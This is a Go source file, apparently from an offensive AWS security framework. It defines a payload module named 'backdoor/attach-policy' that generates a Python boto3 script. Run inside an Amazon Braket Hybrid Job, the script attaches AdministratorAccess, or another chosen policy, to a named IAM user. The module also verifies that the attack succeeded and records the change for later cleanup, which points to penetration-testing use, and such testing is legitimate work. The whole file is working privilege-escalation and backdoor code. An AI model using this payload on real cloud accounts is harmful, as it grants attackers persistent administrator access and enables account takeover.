package braket

import (
	"context"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates a Python script that attaches
// AdministratorAccess (or a custom policy) to a specified IAM user when run
// inside a Braket Hybrid Job container. Parameters are read from environment
// variables, which Braket populates from the job's HyperParameters map.
type BackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess policy to an existing IAM user via Braket Hybrid Job"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceBraket,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_USER",
			Description: "IAM username to attach the policy to (auto-resolved from caller identity if unset)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Policy ARN to attach (defaults to AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_USER"] == "" {
		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode produces a standalone Python script for Braket Hybrid Job execution.
// Parameters are passed as Braket HyperParameters and read from os.environ inside
// the container — Braket injects hyper-parameter key/value pairs as environment variables.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	code := fmt.Sprintf(`import boto3
import os

# Parameters are injected by Braket as environment variables from HyperParameters.
# Defaults fall back to the values baked in at code-generation time.
target_user = os.environ.get("TARGET_USER", %q)
policy_arn = os.environ.get("POLICY_ARN", %q)


def main():
    iam = boto3.client("iam")
    try:
        iam.attach_user_policy(UserName=target_user, PolicyArn=policy_arn)
        print(f"Successfully attached {policy_arn} to user {target_user}")
    except Exception as e:
        print(f"Error attaching policy: {e}")
        raise


if __name__ == "__main__":
    main()
`, targetUser, policyArn)

	return code, nil
}

// ProcessResult passes through the module's result string. Braket jobs do not return
// output to the caller; the module verifies the effect by checking IAM state.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// VerifySuccess checks whether the target user has the expected policy attached.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	if targetUser == "" {
		return false, fmt.Errorf("TARGET_USER not set; cannot verify")
	}

	iamClient := iam.NewFromConfig(config)
	result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
		UserName: aws.String(targetUser),
	})
	if err != nil {
		return false, nil
	}
	for _, policy := range result.AttachedPolicies {
		if aws.ToString(policy.PolicyArn) == policyArn {
			return true, nil
		}
	}
	return false, nil
}

// ReportSideEffects returns the policy attachment as a tracked modification so the
// workspace cleanup system can reverse it.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", targetUser, policyName),
			ARN:           policyArn,
			CleanupMethod: "iam:DetachUserPolicy",
			Metadata: map[string]string{
				"principal_type": "user",
				"principal_name": targetUser,
				"policy_arn":     policyArn,
			},
		},
	}
}
